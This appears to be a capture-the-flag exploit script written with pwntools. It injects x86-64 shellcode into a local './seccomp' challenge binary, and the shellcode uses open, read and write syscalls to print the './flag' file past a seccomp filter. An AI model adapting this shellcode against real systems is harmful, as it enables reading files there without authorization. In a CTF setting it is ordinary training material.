from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# fd = open("./flag", 0)
# read(fd, buf, 0x100)
# write(1, buf, 0x100)
shellcode = asm("""
    mov rdi, 0x67616c662f2e
    push rdi
    mov rax, 2
    mov rdi, rsp
    mov rsi, 0
    syscall

    mov rdi, rax
    sub rsp, 0x100
    mov rax, 0
    mov rsi, rsp
    mov rdx, 0x100
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x100
    syscall
""")

r = process('./seccomp')

r.sendlineafter(b'> ', shellcode)

r.interactive()
